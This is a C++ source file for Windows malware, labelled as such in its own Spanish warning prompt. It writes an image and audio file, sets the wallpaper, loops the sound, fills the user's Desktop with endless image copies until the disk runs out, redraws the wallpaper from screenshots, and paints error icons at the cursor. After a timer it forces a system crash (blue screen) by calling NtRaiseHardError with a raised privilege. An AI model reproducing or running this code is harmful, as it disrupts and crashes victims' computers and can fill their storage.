#include <windows.h>
#include <wingdi.h>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <mmsystem.h>
#include <cstdint>
#include <iostream>
#include <fstream>
#include <thread>

#include "data.h"
#include "config.h"

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "gdi32.lib")

constexpr auto IMGPATH = "C:\\Temp\\sataandagi.jpg";
constexpr auto AUDPATH = "C:\\Temp\\sataandagi.wav";

void writedata() {
    std::ofstream imgf(IMGPATH, std::ios::binary);
    std::ofstream audf(AUDPATH, std::ios::binary);
    imgf.write(reinterpret_cast<const char *>(imgBytes), sizeof(imgBytes));
    audf.write(reinterpret_cast<const char *>(audioBytes), sizeof(audioBytes));
    audf.close();
    imgf.close();
}

void playsound() {
    while(1) {
    	PlaySoundA((LPCSTR)"C:\\Temp\\sataandagi.wav", NULL, SND_SYNC);
    }
}

void fuckdesktop() {
	int i = 0;
	std::string profile = std::getenv("userprofile");
	while (1) {
		std::ofstream f(profile + "\\Desktop\\osaka_" + std::to_string(i) + ".jpg", std::ios::binary);
    		f.write(reinterpret_cast<const char *>(imgBytes), sizeof(imgBytes));
		i++;
		f.close();
	}
}

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

// BSOD
void suicide() {
	Sleep(BSODTIME*1000);
	BOOLEAN bEnabled;
    	ULONG uResp;
    	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
    	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

BOOL WINAPI screenshot(WCHAR *wPath) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE *bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    
    hFile = CreateFileW(wPath, GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return FALSE;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);

    return TRUE;
}



void fuckwall() {
	while (1) {
		Sleep(10*1000);
		screenshot(L"C:\\Temp\\scr.bmp");
    		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "C:\\Temp\\scr.bmp", SPIF_UPDATEINIFILE);
	}
}

void drawerror() {
	while (1) {
		Sleep(0.5*1000);
		int ix = GetSystemMetrics(SM_CXICON) / 2;
		int iy = GetSystemMetrics(SM_CYICON) / 2;
	
		HWND hwnd = GetDesktopWindow();
		HDC hdc = GetWindowDC(hwnd);

		POINT cursor;
		GetCursorPos(&cursor);

		DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
		ReleaseDC(hwnd, hdc);
	}
}



int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {

    if (WARN) {	
    	DWORD result = MessageBoxA(NULL, "este malware te va joder la pc, probablemente crashee, estas seguro de continuar?", "ADVERTENCIA", MB_YESNOCANCEL | MB_ICONWARNING); 

    if (result == IDNO || result == IDCANCEL) {
		    return 0;
    	}
    }
    
    writedata();
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "C:\\Temp\\sataandagi.jpg", SPIF_UPDATEINIFILE);

    std::thread t1(playsound);
    std::thread t2(fuckdesktop);
    std::thread t3(fuckwall);
    std::thread t4(suicide);
    std::thread t5(drawerror);


    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    return 0;
}
